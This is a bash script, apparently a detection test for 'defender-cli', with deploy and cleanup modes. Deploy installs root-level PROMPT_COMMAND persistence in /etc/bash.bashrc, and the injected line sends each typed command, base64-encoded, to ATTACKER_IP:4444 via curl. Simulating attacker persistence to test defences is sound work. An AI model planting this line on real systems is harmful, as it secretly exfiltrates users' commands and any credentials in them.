#!/usr/bin/env bash
# PROMPT_COMMAND persistence: injected into /etc/bash.bashrc so it fires on
# every interactive bash prompt.
# Detected by: defender-cli anti-persistence --prompt-command
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
TARGET="/etc/bash.bashrc"
BACKUP="/tmp/defender-test-bash.bashrc.bak"
TAG="DEFENDER-TEST-prompt-command"

PAYLOAD="export PROMPT_COMMAND='curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/shell?cmd=\$(history 1 | base64) -o /dev/null 2>/dev/null' # ${TAG}"

case "${1:-}" in
  deploy)
    [[ -f "$TARGET" ]] && cp "$TARGET" "$BACKUP"
    echo "$PAYLOAD" >> "$TARGET"
    echo "[+] 17_prompt_command: injected into $TARGET"
    ;;
  cleanup)
    if [[ -f "$BACKUP" ]]; then
      mv "$BACKUP" "$TARGET"
      echo "[-] 17_prompt_command: $TARGET restored from backup"
    else
      sed -i "/$TAG/d" "$TARGET" 2>/dev/null || true
      echo "[-] 17_prompt_command: line removed from $TARGET"
    fi
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
